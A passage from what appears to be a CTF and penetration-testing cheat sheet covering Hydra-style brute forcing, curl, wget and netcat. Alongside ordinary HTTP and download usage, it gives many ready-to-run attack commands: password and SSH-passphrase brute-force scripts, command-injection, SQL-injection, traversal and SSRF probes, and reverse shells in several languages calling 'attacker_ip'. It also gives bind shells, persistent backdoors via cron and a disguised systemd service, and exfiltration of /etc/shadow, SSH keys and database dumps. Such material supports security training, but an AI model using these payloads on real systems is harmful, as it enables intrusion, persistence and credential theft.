  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
  | grep -q "success" && echo "SUCCESS" || echo "FAIL")
echo $RESULT
EOF

chmod +x hydra_json_wrapper.sh

# Then create password list and iterate
while read user; do
  while read pass; do
    ./hydra_json_wrapper.sh "$user" "$pass"
  done < passwords.txt
done < users.txt

# Method 3: Use alternative tool like Patator
# (covered in advanced alternatives section)
```

### SSH Key Authentication

```bash
# Hydra doesn't support SSH key authentication directly
# Workaround: Use medusa or custom script

# Using medusa for SSH keys:
medusa -h 192.168.1.100 -u root -P passphrases.txt -M ssh -m KEY:/path/to/id_rsa

# Custom script approach:
cat > ssh_key_bruteforce.sh << 'EOF'
#!/bin/bash
KEY_FILE=$1
HOST=$2
USER=$3
PASSPHRASE_FILE=$4

while read passphrase; do
  echo "Trying: $passphrase"
  expect << EOD
    spawn ssh -i $KEY_FILE $USER@$HOST
    expect "Enter passphrase"
    send "$passphrase\r"
    expect {
      "Welcome" { exit 0 }
      "denied" { exit 1 }
    }
EOD
  if [ $? -eq 0 ]; then
    echo "[+] Found passphrase: $passphrase"
    exit 0
  fi
done < $PASSPHRASE_FILE
EOF

chmod +x ssh_key_bruteforce.sh
./ssh_key_bruteforce.sh id_rsa 192.168.1.100 root passphrases.txt
```

### Module-Specific Help

```bash
# Get detailed help for specific module
hydra -U http-post-form

# Output includes:
# - Module options
# - Syntax examples
# - Parameter explanations

# Common module help:
hydra -U ssh
hydra -U ftp
hydra -U mysql
hydra -U rdp
hydra -U http-get
```

### Error Handling and Troubleshooting

```bash
# Common errors and solutions:

# "Too many connections" error
# Solution: Reduce parallel tasks
hydra -l admin -P passwords.txt -t 4 ssh://target.com

# "Connection refused"
# Solution: Verify service is running and port is correct
nmap -p 22 target.com
hydra -l admin -P passwords.txt ssh://target.com -s 22

# "No valid responses"
# Solution: Check failure/success string
# Test manually first:
curl -X POST https://target.com/login -d "username=wrong&password=wrong"
# Note the exact error message

# SSL/TLS errors
# Solution: Skip certificate verification or update CA certificates
# Hydra doesn't have built-in SSL skip, use stunnel as proxy

# Rate limiting detected
# Solution: Slow down and add delays
hydra -l admin -P passwords.txt -t 1 -w 60 ssh://target.com

# Account lockout
# Solution: Use -e nsr for quick checks, avoid full bruteforce
hydra -l admin -e nsr ssh://target.com  # Only tries empty, same, reversed
```

### Alternative Tools to Hydra

**When Hydra limitations are reached:**

```bash
# Medusa - similar to Hydra, different strengths
medusa -h target.com -u admin -P passwords.txt -M ssh

# Patator - better for complex scenarios
patator http_fuzz \
  url=https://target.com/login \
  method=POST \
  body='username=admin&password=FILE0' \
  0=passwords.txt \
  -x ignore:fgrep='Invalid'

# Ncrack - Nmap's network authentication cracker
ncrack -u admin -P passwords.txt ssh://target.com

# Crowbar - specifically for RDP and VNC with NLA
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt

# Custom Python script with requests
cat > bruteforce.py << 'EOF'
#!/usr/bin/env python3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = "https://target.com/login"
USERS = ["admin"]
PASSWORDS = open("passwords.txt").read().splitlines()

for user in USERS:
    for password in PASSWORDS:
        data = {"username": user, "password": password}
        r = requests.post(URL, data=data, verify=False, allow_redirects=False)
        
        if "Invalid" not in r.text:
            print(f"[+] Found: {user}:{password}")
            break
        else:
            print(f"[-] Failed: {user}:{password}")
EOF

python3 bruteforce.py
```

## curl and wget

Essential command-line tools for web interaction, file downloads, and HTTP/HTTPS request manipulation in CTF scenarios.

### curl - Basics

```bash
# Simple GET request
curl https://target.com

# Save output to file
curl https://target.com -o output.html
curl https://target.com/file.zip -O  # Use remote filename

# Follow redirects
curl -L https://target.com

# Show HTTP headers in output
curl -i https://target.com

# Show only HTTP headers
curl -I https://target.com
curl --head https://target.com

# Verbose output (includes request headers)
curl -v https://target.com
curl --verbose https://target.com

# Silent mode (no progress bar)
curl -s https://target.com

# Silent but show errors
curl -sS https://target.com
```

### curl - Custom Headers

```bash
# Custom User-Agent
curl -A "Mozilla/5.0" https://target.com
curl --user-agent "Custom Agent" https://target.com

# Custom header
curl -H "X-API-Key: secret123" https://target.com/api
curl --header "Authorization: Bearer token123" https://target.com/api

# Multiple headers
curl -H "X-API-Key: abc" -H "X-Custom: value" https://target.com

# Referer header
curl -e "https://google.com" https://target.com
curl --referer "https://google.com" https://target.com

# Content-Type header
curl -H "Content-Type: application/json" https://target.com
```

### curl - POST Requests

```bash
# Simple POST with data
curl -X POST https://target.com/api -d "key=value"
curl --data "username=admin&password=pass" https://target.com/login

# POST with JSON
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass"}'

# POST from file
curl -X POST https://target.com/api -d @data.json

# URL-encoded POST
curl --data-urlencode "data=hello world" https://target.com

# POST with form file upload
curl -F "file=@document.pdf" https://target.com/upload
curl -F "file=@image.jpg;type=image/jpeg" https://target.com/upload

# Multipart form data
curl -F "name=John" -F "file=@data.txt" https://target.com/submit
```

### curl - Authentication

```bash
# Basic authentication
curl -u username:password https://target.com
curl --user admin:pass123 https://target.com/admin

# Prompt for password (security)
curl -u username https://target.com
# Will prompt: Enter host password for user 'username':

# Bearer token
curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api

# Digest authentication
curl --digest -u username:password https://target.com

# NTLM authentication
curl --ntlm -u username:password https://target.com

# API key in URL
curl "https://target.com/api?key=YOUR_API_KEY"
```

### curl - Cookies

```bash
# Send cookie
curl -b "session=abc123" https://target.com
curl --cookie "name=value; session=xyz" https://target.com

# Save cookies to file
curl -c cookies.txt https://target.com

# Load cookies from file
curl -b cookies.txt https://target.com

# Both save and load
curl -b cookies.txt -c cookies.txt https://target.com/login

# Cookie jar for session management
curl -c jar.txt https://target.com/login -d "user=admin&pass=pass"
curl -b jar.txt https://target.com/dashboard
```

### curl - SSL/TLS

```bash
# Ignore SSL certificate errors
curl -k https://self-signed.target.com
curl --insecure https://target.com

# Specify SSL version
curl --tlsv1.2 https://target.com
curl --tlsv1.3 https://target.com

# Show SSL certificate info
curl -v https://target.com 2>&1 | grep -A 10 "Server certificate"

# Use specific CA certificate
curl --cacert ca-bundle.crt https://target.com

# Client certificate authentication
curl --cert client.pem --key client-key.pem https://target.com

# Show TLS handshake details
curl -v --trace-ascii trace.txt https://target.com
```

### curl - Advanced Options

```bash
# Set timeout
curl --connect-timeout 10 https://target.com  # Connection timeout
curl --max-time 30 https://target.com        # Total operation timeout

# Retry on failure
curl --retry 3 https://target.com
curl --retry 5 --retry-delay 2 https://target.com

# Limit transfer rate
curl --limit-rate 100K https://target.com/large-file.zip

# Resume download
curl -C - -O https://target.com/large-file.zip

# Follow redirects with limit
curl -L --max-redirs 5 https://target.com

# Custom HTTP method
curl -X DELETE https://target.com/api/resource/123
curl -X PUT https://target.com/api/resource -d @data.json
curl -X PATCH https://target.com/api/resource -d '{"field":"value"}'

# Show response time
curl -w "@-" -o /dev/null -s https://target.com << EOF
    time_namelookup:  %{time_namelookup}s\n
       time_connect:  %{time_connect}s\n
    time_appconnect:  %{time_appconnect}s\n
   time_pretransfer:  %{time_pretransfer}s\n
      time_redirect:  %{time_redirect}s\n
 time_starttransfer:  %{time_starttransfer}s\n
                    ----------\n
         time_total:  %{time_total}s\n
EOF
```

### curl - Output Formatting

```bash
# Write output format variables
curl -w "HTTP Status: %{http_code}\n" https://target.com

# Common format variables:
# %{http_code} - HTTP status code
# %{size_download} - Downloaded bytes
# %{speed_download} - Download speed
# %{time_total} - Total time
# %{url_effective} - Final URL after redirects

# Complete timing breakdown
curl -w "\nDNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTotal: %{time_total}s\n" \
  -o /dev/null -s https://target.com

# JSON-like output
curl -s https://target.com/api/users | jq .

# Pretty-print JSON
curl -s https://target.com/api/data | python3 -m json.tool

# Extract specific fields
curl -s https://target.com/api/user | jq '.username, .email'
```

### curl - Proxy Usage

```bash
# HTTP proxy
curl -x http://proxy.example.com:8080 https://target.com
curl --proxy http://proxy:8080 https://target.com

# SOCKS proxy
curl -x socks5://127.0.0.1:1080 https://target.com

# Proxy with authentication
curl -x http://proxy:8080 -U proxyuser:proxypass https://target.com

# Bypass proxy for specific hosts
curl --noproxy "localhost,127.0.0.1" -x http://proxy:8080 https://target.com

# Use Burp Suite as proxy for traffic inspection
curl -x http://127.0.0.1:8080 -k https://target.com
```

### curl - File Operations

```bash
# Download file
curl -O https://target.com/file.zip
curl -o custom_name.zip https://target.com/file.zip

# Download multiple files
curl -O https://target.com/file1.txt -O https://target.com/file2.txt

# Resume interrupted download
curl -C - -O https://target.com/large-file.zip

# Upload file (PUT)
curl -T file.txt https://target.com/upload/file.txt
curl --upload-file document.pdf https://target.com/upload/

# FTP download
curl -u username:password ftp://ftp.target.com/file.txt -O

# FTP upload
curl -T file.txt -u username:password ftp://ftp.target.com/
```

### curl - CTF Specific Techniques

```bash
# Extract hidden comments
curl -s https://target.com | grep -o "<!--.*-->"

# Find all links
curl -s https://target.com | grep -oP 'href="\K[^"]+' 

# Extract all JavaScript files
curl -s https://target.com | grep -oP 'src="\K[^"]+\.js'

# Check for specific header
curl -I https://target.com | grep -i "X-Flag"

# Test HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo "Testing $method:"
  curl -X $method -I https://target.com/api/endpoint
done

# Fuzz parameters
for i in {1..100}; do
  curl -s "https://target.com/api/user?id=$i" | grep -i "flag"
done

# Test for command injection
curl "https://target.com/ping?host=127.0.0.1;cat%20/etc/passwd"
curl "https://target.com/ping?host=\`whoami\`"

# Test for SQL injection
curl "https://target.com/user?id=1' OR '1'='1"
curl "https://target.com/user?id=1 UNION SELECT NULL,NULL,NULL--"

# Directory traversal
curl "https://target.com/download?file=../../../../etc/passwd"
curl "https://target.com/image?path=..%2f..%2f..%2fetc%2fpasswd"

# SSRF attempts
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/proxy?url=http://localhost:8080/admin"
```

### curl - Rate Limiting and Scripting

```bash
# Loop with delay to avoid rate limiting
for url in $(cat urls.txt); do
  curl -s "$url" >> results.txt
  sleep 2
done

# Parallel requests with xargs
cat urls.txt | xargs -P 5 -I {} curl -s -o /dev/null -w "%{http_code} {}\n" {}

# Check multiple endpoints
endpoints=("api/v1/users" "api/v2/data" "admin/dashboard")
for endpoint in "${endpoints[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$endpoint")
  echo "$endpoint: $status"
done

# Brute force directory enumeration
while read dir; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$dir")
  [ "$status" = "200" ] && echo "[+] Found: $dir (Status: $status)"
done < directories.txt
```

### wget - Basics

```bash
# Simple download
wget https://target.com/file.zip

# Custom output filename
wget -O custom_name.html https://target.com

# Continue interrupted download
wget -c https://target.com/large-file.zip

# Download in background
wget -b https://target.com/file.zip

# Limit download speed
wget --limit-rate=200k https://target.com/file.zip

# Download with retries
wget --tries=10 https://target.com/file.zip
wget -t 5 https://target.com/file.zip

# Quiet mode
wget -q https://target.com/file.zip

# Verbose output
wget -v https://target.com/file.zip
```

### wget - Recursive Downloads

```bash
# Download entire website
wget --mirror --convert-links --page-requisites https://target.com

# Download to specific depth
wget -r -l 3 https://target.com
# -r: recursive
# -l 3: max depth 3 levels

# Download only specific file types
wget -r -A pdf,doc,docx https://target.com

# Exclude specific file types
wget -r -R gif,jpg,jpeg,png https://target.com

# Download from list of URLs
wget -i urls.txt

# Span hosts (follow links to other domains)
wget -r -H https://target.com
# -H: span hosts

# Limit to specific domains
wget -r -D target.com,cdn.target.com https://target.com
```

### wget - Authentication and Cookies

```bash
# HTTP Basic authentication
wget --user=username --password=password https://target.com/admin

# Load cookies from file
wget --load-cookies=cookies.txt https://target.com

# Save cookies to file
wget --save-cookies=cookies.txt --keep-session-cookies https://target.com

# Custom header
wget --header="X-API-Key: secret" https://target.com/api

# POST request
wget --post-data="username=admin&password=pass" https://target.com/login

# POST JSON
wget --header="Content-Type: application/json" \
  --post-data='{"user":"admin","pass":"secret"}' \
  https://target.com/api/login
```

### wget - SSL/TLS

```bash
# Ignore SSL certificate errors
wget --no-check-certificate https://self-signed.target.com

# Specify CA certificate
wget --ca-certificate=ca-cert.pem https://target.com

# Client certificate
wget --certificate=client.pem --private-key=key.pem https://target.com
```

### wget - Advanced Options

```bash
# Set timeout
wget --timeout=30 https://target.com
wget --dns-timeout=10 --connect-timeout=10 --read-timeout=15 https://target.com

# Custom User-Agent
wget --user-agent="Mozilla/5.0" https://target.com

# Set Referer
wget --referer="https://google.com" https://target.com

# Wait between downloads (avoid rate limiting)
wget -w 5 -r https://target.com
# -w 5: wait 5 seconds between downloads

# Random wait
wget --random-wait -r https://target.com

# Reject robots.txt
wget -e robots=off https://target.com

# Adjust timestamp of downloaded files
wget --timestamping https://target.com/file.zip
# Only downloads if remote file is newer
```

### wget - Directory and File Options

```bash
# Create directory structure
wget -x https://target.com/path/to/file.html
# -x: force directories (creates target.com/path/to/)

# Prefix for created directories
wget -P /download/location https://target.com/file.zip

# Flatten directory structure
wget -nd -r https://target.com
# -nd: no directories

# Cut directories
wget --cut-dirs=2 -r https://target.com/dir1/dir2/file.html
# Removes first 2 directory levels
```

### wget - Proxy Configuration

```bash
# HTTP proxy
wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 https://target.com

# Environment variable method
export http_proxy="http://proxy:8080"
export https_proxy="http://proxy:8080"
wget https://target.com

# SOCKS proxy
# wget doesn't support SOCKS directly, use tsocks or proxychains
proxychains wget https://target.com
```

### wget vs curl - When to Use

```bash
# Use curl when:
# - Testing APIs
# - Need detailed control over requests
# - Working with HTTP headers extensively
# - Scripting complex HTTP interactions
# - Need to see request/response details

# Use wget when:
# - Downloading files/websites recursively
# - Mirroring websites
# - Resuming downloads
# - Background downloads
# - Simple batch downloads from URL list

# Example: Download all PDFs from website
wget -r -l 1 -A pdf https://target.com/documents/

# Example: Test API endpoint
curl -X POST https://target.com/api/test \
  -H "Content-Type: application/json" \
  -d '{"test":"data"}' \
  -v
```

### CTF-Specific wget Techniques

```bash
# Download robots.txt
wget https://target.com/robots.txt
cat robots.txt  # Look for hidden directories

# Download sitemap
wget https://target.com/sitemap.xml

# Mirror site for offline analysis
wget --mirror --convert-links --adjust-extension \
  --page-requisites --no-parent https://target.com

# Download all JavaScript files
wget -r -l 1 -A js -nd https://target.com

# Extract and download from HTML
curl -s https://target.com | \
  grep -oP 'href="\K[^"]+\.pdf' | \
  wget -i -

# Download with specific pattern
wget -r -l 1 -A "*flag*" https://target.com
```

## netcat

Netcat (nc) is the "Swiss Army knife" of networking - essential for port scanning, banner grabbing, file transfers, reverse shells, and network debugging.

### Basic Netcat Usage

```bash
# Check if netcat is installed
nc -h
which nc

# Kali includes both traditional nc and ncat (Nmap's netcat)
nc --version
ncat --version

# Connect to remote host/port
nc target.com 80
nc 192.168.1.100 22

# Verbose mode
nc -v target.com 80
nc -vv target.com 80  # Extra verbose

# Timeout
nc -w 5 target.com 80  # 5 second timeout

# UDP mode (default is TCP)
nc -u target.com 53
```

### Banner Grabbing

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Alternative HTTP method
nc target.com 80
# Then type:
# GET / HTTP/1.1
# Host: target.com
# [Press Enter twice]

# SSH banner
nc target.com 22

# FTP banner
nc target.com 21

# SMTP banner
nc target.com 25
# Type: EHLO test

# POP3 banner
nc mail.target.com 110

# IMAP banner
nc mail.target.com 143

# Banner grab with timeout
timeout 3 nc -v target.com 80

# Automated banner grabbing script
for port in 21 22 23 25 80 110 143 443; do
  echo "Port $port:"
  timeout 2 nc -v target.com $port 2>&1 | head -5
  echo "---"
done
```

### Port Scanning

```bash
# Simple port scan
nc -zv target.com 80

# Scan range of ports
nc -zv target.com 20-100

# Scan multiple specific ports
for port in 21 22 23 80 443 3306; do
  nc -zv target.com $port
done

# Scan and show only open ports
nc -zv target.com 1-1000 2>&1 | grep succeeded

# UDP port scan
nc -zvu target.com 53
nc -zvu target.com 1-100

# Fast scan (reduce wait time)
nc -zvn -w 1 target.com 1-1000

# Note: For comprehensive scanning, use nmap instead
```

### Listening (Server Mode)

```bash
# Listen on port
nc -l -p 4444
# or
nc -lvp 4444

# Listen on specific interface
nc -l -p 4444 -s 192.168.1.100

# Listen and execute command on connection
nc -l -p 4444 -e /bin/bash  # Traditional nc
ncat -l -p 4444 -e /bin/bash  # ncat

# Listen once (close after first connection)
nc -l -p 4444

# Keep listening (wait for multiple connections)
nc -lk -p 4444  # GNU netcat
while true; do nc -l -p 4444; done  # Traditional nc workaround
```

### File Transfer

```bash
# Receive file (listener)
nc -l -p 4444 > received_file.txt

# Send file (client)
nc target.com 4444 < file_to_send.txt

# Send entire directory (tar)
# Receiver:
nc -l -p 4444 | tar xzvf -

# Sender:
tar czvf - /path/to/directory | nc target.com 4444

# Transfer with progress (using pv)
# Receiver:
nc -l -p 4444 | pv > file.zip

# Sender:
pv file.zip | nc target.com 4444

# Encrypted file transfer with OpenSSL
# Receiver:
nc -l -p 4444 | openssl enc -d -aes256 -pass pass:secret > file.txt

# Sender:
openssl enc -aes256 -pass pass:secret < file.txt | nc target.com 4444
```

### Reverse Shell

```bash
# Victim machine (connects back to attacker)
nc attacker_ip 4444 -e /bin/bash  # Traditional nc
ncat attacker_ip 4444 -e /bin/bash  # ncat

# If -e not available (common), use:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Attacker machine (listener)
nc -lvp 4444

# Reverse shell variations:

# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl reverse shell
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP reverse shell
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bind Shell

```bash
# Victim machine (listens for connection)
nc -l -p 4444 -e /bin/bash  # Traditional nc
ncat -l -p 4444 -e /bin/bash  # ncat

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f

# Attacker machine (connects to victim)
nc victim_ip 4444

# Bind shell with password protection (ncat only)
# Victim:
ncat -l -p 4444 --allow attacker_ip -e /bin/bash

# Victim with SSL (encrypted bind shell)
ncat -l -p 4444 --ssl -e /bin/bash

# Attacker connects with SSL
ncat --ssl victim_ip 4444
```

### Chat/Messaging

```bash
# Simple chat between two machines

# Machine 1 (listener)
nc -l -p 4444

# Machine 2 (client)
nc machine1_ip 4444

# Both can now type messages back and forth
# Press Ctrl+D to send EOF and close connection
```

### HTTP/Web Requests

```bash
# Manual HTTP GET request
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# HTTP POST request
echo -e "POST /login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 27\r\n\r\nusername=admin&password=test" | nc target.com 80

# Test for HTTP methods
echo -e "OPTIONS / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# HTTP header injection test
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\nX-Test: value\r\n\r\n" | nc target.com 80

# Retrieve webpage
echo -e "GET /index.html HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n" | nc target.com 80

# Download file via HTTP
echo -e "GET /file.zip HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n" | nc target.com 80 > file.zip
```

### Proxying and Relaying

```bash
# Simple TCP proxy/relay
# Forward connections from local port 8080 to remote host

# Create named pipe
mkfifo backpipe

# Relay traffic
nc -l -p 8080 0<backpipe | nc target.com 80 1>backpipe

# Bi-directional relay script
cat > tcp_relay.sh << 'EOF'
#!/bin/bash
LOCAL_PORT=$1
REMOTE_HOST=$2
REMOTE_PORT=$3

mkfifo /tmp/relay_pipe
nc -l -p $LOCAL_PORT < /tmp/relay_pipe | nc $REMOTE_HOST $REMOTE_PORT > /tmp/relay_pipe
rm /tmp/relay_pipe
EOF

chmod +x tcp_relay.sh
./tcp_relay.sh 8080 target.com 80

# Using ncat for relaying (simpler)
ncat -l -p 8080 --sh-exec "ncat target.com 80"
```

### Port Forwarding

```bash
# Local port forwarding
# Listen locally and forward to remote host

# Simple port forward using named pipes
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc target.com 80 1>backpipe

# SSH-based alternative (more reliable)
ssh -L 8080:target.com:80 user@jumphost

# ncat broker mode (ncat only)
# Host A (broker):
ncat -l --broker

# Host B (connect):
ncat --send-only broker_ip < file.txt

# Host C (connect):
ncat broker_ip > received_file.txt
```

### Testing Services

```bash
# Test SMTP relay
nc mail.target.com 25
# Type:
# HELO test.com
# MAIL FROM: <test@test.com>
# RCPT TO: <victim@target.com>
# DATA
# Subject: Test
# Test message body
# .
# QUIT

# Test FTP anonymous access
nc ftp.target.com 21
# Type:
# USER anonymous
# PASS anonymous@test.com
# LIST
# QUIT

# Test POP3 mailbox
nc mail.target.com 110
# Type:
# USER username
# PASS password
# LIST
# RETR 1
# QUIT

# Test IMAP
nc mail.target.com 143
# Type:
# A001 LOGIN username password
# A002 LIST "" "*"
# A003 SELECT INBOX
# A004 LOGOUT

# Test MySQL (basic)
nc target.com 3306
# Will show MySQL server version in greeting

# Test SSH version
nc target.com 22
# Displays SSH version banner

# Test Redis (if no auth)
echo -e "PING\r\n" | nc target.com 6379
# Should respond with +PONG

# Test Memcached
echo -e "stats\r\nquit\r\n" | nc target.com 11211
```

### Backdoor Creation

```bash
# Persistent backdoor (runs on boot)
# Add to /etc/rc.local or systemd service

# Simple backdoor script
cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
while true; do
  nc -l -p 4444 -e /bin/bash
  sleep 5
done
EOF

chmod +x /tmp/backdoor.sh
nohup /tmp/backdoor.sh &

# Cron-based backdoor (restart every minute)
(crontab -l 2>/dev/null; echo "* * * * * nc attacker_ip 4444 -e /bin/bash") | crontab -

# Systemd service backdoor
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Network Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -l -p 4444 -e /bin/bash; sleep 5; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

### Data Exfiltration

```bash
# Exfiltrate data over netcat

# Attacker (listener):
nc -l -p 4444 > exfiltrated_data.tar.gz

# Victim (send data):
tar czf - /etc/passwd /etc/shadow /home/user/.ssh | nc attacker_ip 4444

# Exfiltrate database dump
# Attacker:
nc -l -p 4444 > database_dump.sql

# Victim:
mysqldump -u root -ppassword database_name | nc attacker_ip 4444

# Exfiltrate over HTTP (if direct connection blocked)
# Attacker runs web server:
nc -l -p 80 > received_data.txt

# Victim sends via HTTP POST:
tar czf - /sensitive/data | nc attacker_ip 80

# Split and exfiltrate large files
# Victim:
split -b 10M sensitive.zip chunk_
for chunk in chunk_*; do
  nc attacker_ip 4444 < $chunk
  sleep 2
done

# Attacker:
nc -l -p 4444 > chunk_aa
nc -l -p 4444 > chunk_ab
# Then combine:
cat chunk_* > sensitive.zip
```

### Network Debugging

```bash
# Test if port is open/filtered
nc -zv target.com 80

# Check network latency
time nc -z target.com 80

# Test UDP connectivity
echo "test" | nc -u target.com 53

# Verify service response
echo "test" | nc target.com 80
# See if service responds

# Test connection timeout
nc -w 5 target.com 9999
# Will timeout after 5 seconds if port closed

# Monitor network traffic
# Terminal 1 (listener):
nc -l -p 4444 | tee traffic_log.txt

# Terminal 2 (client):
nc localhost 4444
# Type messages to see them logged

# Measure bandwidth
# Receiver:
nc -l -p 4444 > /dev/null

# Sender:
dd if=/dev/zero bs=1M count=100 | nc receiver_ip 4444
# Monitor with iftop or nethogs
```

### CTF-Specific Techniques

```bash
# Connect to CTF challenge server
nc challenge.ctf.com 9999

# Send exploit payload
echo -e "AAAA\x90\x90\x90\x90\xef\xbe\xad\xde" | nc target.com 4444

# Interactive exploitation with Python
python exploit.py | nc target.com 1337

# Receive flag from service
echo "GIVE FLAG" | nc challenge.ctf.com 9999

# Bruteforce PIN via netcat
for pin in {0000..9999}; do
  echo $pin | nc target.com 4444 | grep -q "Correct" && echo "Found: $pin" && break
done

# Format string exploitation
echo "%x %x %x %x %x %s" | nc vulnerable.com 4444

# Buffer overflow testing
python -c "print 'A'*200" | nc target.com 4444

# ROPchain delivery
cat exploit_payload.bin | nc target.com 4444

# Multi-stage payload delivery
# Stage 1: Get shell
echo "get_shell" | nc target.com 9999
# Stage 2: Execute commands in opened shell
```

### Advanced ncat Features

```bash
# SSL/TLS encrypted communication
# Server (generate self-signed cert first):
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
ncat -l -p 4444 --ssl --ssl-cert cert.pem --ssl-key key.pem

# Client:
ncat --ssl target.com 4444

# SSL with verification
ncat --ssl --ssl-verify --ssl-trustfile ca-bundle.crt target.com 4444

# Access control (whitelist)
ncat -l -p 4444 --allow 192.168.1.100

# Access control (blacklist)
ncat -l -p 4444 --deny 192.168.1.50

# Allow subnet
ncat -l -p 4444 --allow 192.168.1.0/24

# Execute command on connect (like -e)
ncat -l -p 4444 --sh-exec "/bin/bash"
ncat -l -p 4444 --exec "/bin/bash"

# Broker mode (multi-client chat)
ncat -l --broker

# HTTP server mode
ncat -l -p 8080 --keep-open --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n\r\nHello World'"

# Lua scripting (ncat only)
ncat -l -p 4444 --lua-exec script.lua

# Chat server with logging
ncat -l --broker --output chat_log.txt

# IPv6 support
ncat -6 -l -p 4444
ncat -6 ::1 4444
```

### Scripting with Netcat

```bash
# Port scanner script
cat > nc_scanner.sh << 'EOF'
#!/bin/bash
HOST=$1
START_PORT=$2
END_PORT=$3

for port in $(seq $START_PORT $END_PORT); do
  timeout 1 nc -zv $HOST $port 2>&1 | grep -q "succeeded" && echo "Port $port: OPEN"
done
EOF

chmod +x nc_scanner.sh
./nc_scanner.sh target.com 1 1000

# Service banner grabber
cat > banner_grab.sh << 'EOF'
#!/bin/bash
HOST=$1
PORT=$2

timeout 3 nc -v $HOST $PORT 2>&1 | head -n 10
EOF

chmod +x banner_grab.sh
./banner_grab.sh target.com 22

# Automated reverse shell attempts
cat > auto_reverse_shell.sh << 'EOF'
#!/bin/bash
ATTACKER_IP=$1
ATTACKER_PORT=$2

# Try multiple methods
methods=(
  "nc $ATTACKER_IP $ATTACKER_PORT -e /bin/bash"
  "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $ATTACKER_PORT > /tmp/f"
  "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
)

for method in "${methods[@]}"; do
  eval $method 2>/dev/null && break
done
EOF

chmod +x auto_reverse_shell.sh

# Listener with logging
cat > nc_listener.sh << 'EOF'
#!/bin/bash
PORT=$1
LOGFILE="nc_session_$(date +%Y%m%d_%H%M%S).log"

nc -l -p $PORT | tee $LOGFILE
EOF

chmod +x nc_listener.sh
./nc_listener.sh 4444

# File transfer with verification
cat > nc_transfer.sh << 'EOF'
#!/bin/bash
# Usage: ./nc_transfer.sh send|receive <file> <ip> <port>

MODE=$1
FILE=$2
IP=$3
PORT=$4

if [ "$MODE" = "send" ]; then
  MD5_BEFORE=$(md5sum "$FILE" | awk '{print $1}')
  echo "Sending $FILE (MD5: $MD5_BEFORE)"
  nc $IP $PORT < "$FILE"
elif [ "$MODE" = "receive" ]; then
  nc -l -p $PORT > "$FILE"
  MD5_AFTER=$(md5sum "$FILE" | awk '{print $1}')
  echo "Received $FILE (MD5: $MD5_AFTER)"
fi
EOF

chmod +x nc_transfer.sh
```

### Netcat Alternatives and Variants

```bash
# Ncat (Nmap's netcat) - enhanced features
ncat -h

# Socat - bidirectional data relay
socat TCP-LISTEN:4444,fork TCP:target.com:80

# Cryptcat - encrypted netcat
cryptcat -l -p 4444

# OpenBSD netcat (nc.openbsd)
# Comes with better IPv6 and Unix socket support

# GNU netcat (netcat-traditional)
# Original implementation

# Check which version installed
nc -h 2>&1 | head -1
ls -la $(which nc)
```

### Netcat One-Liners

```bash
# Quick web server
while true; do echo -e "HTTP/1.1 200 OK\n\n$(date)" | nc -l -p 8080 -q 1; done

# Transfer directory
# Receiver:
nc -l -p 4444 | tar xzvf -
# Sender:
tar czvf - /path/to/dir | nc receiver_ip 4444

# Remote command execution
nc -l -p 4444 -e /bin/bash

# Get public IP
echo -e "GET / HTTP/1.1\nHost: ifconfig.me\n\n" | nc ifconfig.me 80

# Port knock
for port in 1000 2000 3000; do nc -zv target.com $port; done

# Persistent listener
while true; do nc -l -p 4444; done

# UDP listener
nc -u -l -p 5353

# Connect with custom source port
nc -p 12345 target.com 80

# Hexdump mode
nc target.com 80 | xxd

# Save session to file
nc target.com 80 | tee session.log

# Telnet emulation
nc target.com 23

# Test if host is up
nc -zv -w 1 target.com 80 && echo "Host is up" || echo "Host is down"
```

### Troubleshooting and Tips

```bash
# Common issues:

# "Address already in use"
# Solution: Port is already bound, choose different port or kill process
lsof -i :4444
